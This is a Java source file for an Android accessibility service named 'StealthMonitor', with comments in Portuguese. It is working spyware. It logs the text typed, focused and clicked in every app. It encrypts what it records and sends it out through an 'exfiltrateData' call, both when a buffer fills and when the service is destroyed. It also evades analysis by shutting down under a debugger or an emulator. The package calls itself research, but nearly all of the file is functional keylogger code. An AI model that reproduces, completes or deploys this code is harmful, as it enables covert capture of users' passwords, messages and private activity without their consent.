package com.research.stealthmonitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.research.stealthmonitor.utils.CryptoUtils;
import com.research.stealthmonitor.utils.NetworkUtils;
import com.research.stealthmonitor.utils.StealthUtils;

/**
 * Accessibility Service para captura global de eventos
 * Técnica principal para monitoramento sem root
 */
public class AccessibilityMonitor extends AccessibilityService {
    
    private static final String TAG = "StealthMonitor";
    private CryptoUtils cryptoUtils;
    private NetworkUtils networkUtils;
    private StringBuilder dataBuffer;
    private static final int BUFFER_SIZE = 4096;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Verificações anti-análise
        if (StealthUtils.isDebugging() || StealthUtils.isEmulator()) {
            stopSelf();
            return;
        }
        
        cryptoUtils = new CryptoUtils();
        networkUtils = new NetworkUtils();
        dataBuffer = new StringBuilder();
        
        Log.d(TAG, "AccessibilityMonitor iniciado");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            processAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar evento", e);
        }
    }
    
    private void processAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? 
                           event.getPackageName().toString() : "unknown";
        
        KeyEvent keyEvent = new KeyEvent();
        keyEvent.timestamp = System.currentTimeMillis();
        keyEvent.packageName = packageName;
        keyEvent.eventType = eventType;
        
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event, keyEvent);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleViewFocused(event, keyEvent);
                break;
                
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChanged(event, keyEvent);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleViewClicked(event, keyEvent);
                break;
        }
        
        // Criptografar e armazenar
        String encryptedData = cryptoUtils.encrypt(keyEvent.toString());
        dataBuffer.append(encryptedData).append("\n");
        
        // Exfiltrar quando buffer estiver cheio
        if (dataBuffer.length() > BUFFER_SIZE) {
            networkUtils.exfiltrateData(dataBuffer.toString());
            dataBuffer.setLength(0);
        }
    }
    
    private void handleTextChanged(AccessibilityEvent event, KeyEvent keyEvent) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            keyEvent.text = event.getText().toString();
            keyEvent.action = "TEXT_CHANGED";
            
            // Capturar contexto adicional
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                keyEvent.className = source.getClassName() != null ? 
                                   source.getClassName().toString() : "";
                keyEvent.viewId = source.getViewIdResourceName();
                source.recycle();
            }
        }
    }
    
    private void handleViewFocused(AccessibilityEvent event, KeyEvent keyEvent) {
        keyEvent.action = "VIEW_FOCUSED";
        if (event.getText() != null) {
            keyEvent.text = event.getText().toString();
        }
    }
    
    private void handleWindowChanged(AccessibilityEvent event, KeyEvent keyEvent) {
        keyEvent.action = "WINDOW_CHANGED";
        if (event.getText() != null) {
            keyEvent.text = event.getText().toString();
        }
        keyEvent.className = event.getClassName() != null ? 
                           event.getClassName().toString() : "";
    }
    
    private void handleViewClicked(AccessibilityEvent event, KeyEvent keyEvent) {
        keyEvent.action = "VIEW_CLICKED";
        if (event.getText() != null) {
            keyEvent.text = event.getText().toString();
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "AccessibilityMonitor interrompido");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        // Configurar o serviço
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED;
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        
        // Capturar de todos os apps
        info.packageNames = null;
        
        setServiceInfo(info);
        
        Log.d(TAG, "AccessibilityMonitor conectado e configurado");
    }
    
    @Override
    public void onDestroy() {
        // Exfiltrar dados restantes
        if (dataBuffer.length() > 0) {
            networkUtils.exfiltrateData(dataBuffer.toString());
        }
        
        super.onDestroy();
        Log.d(TAG, "AccessibilityMonitor destruído");
    }
    
    /**
     * Classe interna para representar eventos capturados
     */
    private static class KeyEvent {
        long timestamp;
        String packageName;
        String text;
        String action;
        String className;
        String viewId;
        int eventType;
        
        @Override
        public String toString() {
            return String.format("%d|%s|%s|%s|%s|%s|%d",
                    timestamp, packageName, text, action, className, viewId, eventType);
        }
    }
}